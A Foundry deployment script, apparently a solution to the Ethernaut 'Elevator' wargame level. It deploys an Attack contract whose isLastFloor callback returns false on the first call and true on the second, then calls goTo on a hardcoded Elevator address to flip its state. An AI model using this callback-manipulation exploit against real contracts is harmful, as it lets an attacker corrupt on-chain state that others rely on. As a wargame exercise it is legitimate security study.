// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Elevator.sol";

contract ElevatorScript is Script {

    Attack a;
    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        a = new Attack();

        a.a();

        vm.stopBroadcast();
    }
}

contract Attack {
    Elevator target;
    bool flag;

    
    function a() external {
        target = Elevator(0x0E87a9D795cf27e3B99B82a152648a401DBFDCe6);
        target.goTo(1);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (!flag) {
            flag = true;
            return false;
        } else {
            return true;
        }
    }
}